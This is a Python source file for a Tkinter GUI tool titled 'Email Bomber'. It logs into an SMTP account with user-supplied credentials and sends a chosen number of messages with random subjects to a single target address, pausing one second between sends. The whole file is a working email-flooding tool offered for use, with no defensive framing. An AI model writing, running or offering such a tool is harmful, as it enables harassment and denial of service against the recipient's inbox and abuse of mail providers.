#!/usr/bin/python
import os, sys, smtplib, threading, random, string, time
from Tkinter import *

class MainWindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "<< Email Bomber >>")
        self.resizable(0,0)

        self.options = {
            'email' : StringVar(),
            'password' : StringVar(),
            'smtp' : StringVar(),
            'port' : IntVar(),
            'total' : IntVar(),
            'to' : StringVar(),
        }

        self.options['email'].set('example@gmail.com')
        self.options['smtp'].set('smtp.gmail.com')
        self.options['port'].set(587)
        self.options['total'].set(1)

        settings = LabelFrame(self, text = 'Settings', height = 150, width = 400)
        settings.grid(row = 0, column = 1)

        Label(settings, text = 'Email address').grid(row = 0, column = 1)
        Entry(settings, textvariable = self.options['email']).grid(row = 0, column = 2)

        Label(settings, text = 'Password').grid(row = 1, column = 1)
        Entry(settings, textvariable = self.options['password'], show = '*').grid(row = 1, column = 2)

        Label(settings, text = 'SMTP server').grid(row = 2, column = 1)
        Entry(settings, textvariable = self.options['smtp']).grid(row = 2, column = 2)

        Label(settings, text = 'Port').grid(row = 3, column = 1)
        Entry(settings, textvariable = self.options['port']).grid(row = 3, column = 2)

        Label(settings, text = 'Amount to send').grid(row = 4, column = 1)
        Entry(settings, textvariable = self.options['total']).grid(row = 4, column = 2)

        Label(settings, text = 'To ').grid(row = 5, column = 1)
        Entry(settings, textvariable = self.options['to']).grid(row = 5, column = 2)

        bodyframe = LabelFrame(self, text = 'Message body')
        bodyframe.grid(row = 2, column = 1)
        self.options['body'] = Text(bodyframe)
        self.options['body'].grid(row = 0, column = 1)

        send_button = Button(self, text = 'Send', command = self.start_thread, width = 30).grid(row = 3, column = 1)

    def start_thread(self):
        thread = threading.Thread(target=self.send)
        thread.daemon = True
        thread.start()

    def send(self):

        smtp = self.options['smtp'].get()
        port = self.options['port'].get()
        email = self.options['email'].get()
        password = self.options['password'].get()
        to = self.options['to'].get()
        #body = self.options['body'].get('1.0', END)
        body = ''
        total = self.options['total'].get()

        try:
            server = smtplib.SMTP(smtp,port)
            server.ehlo()
            if smtp == "smtp.gmail.com":
                    server.starttls()
            server.login(email,password)
            for i in range(1, total+1):
                subject = gen_string()
                msg = 'From: ' + email + '\nSubject: ' + subject + '\n' + body
                server.sendmail(email,to,msg)
                self.title(string = 'Email Bomber | Total sent: %i' % i)
                time.sleep(1)
            server.quit()
        except smtplib.SMTPAuthenticationError:
            self.title(string = 'Invalid username or password')
        except Exception as e:
            self.title(string = e)
            print(e)

def gen_string(size=6, chars=string.ascii_uppercase + string.digits):
      return ''.join(random.choice(chars) for _ in range(size))



if __name__ == '__main__':
    try:
        bomber = MainWindow()
        bomber = mainloop()
    except Exception as e:
        print('[ERROR] %s' % e)
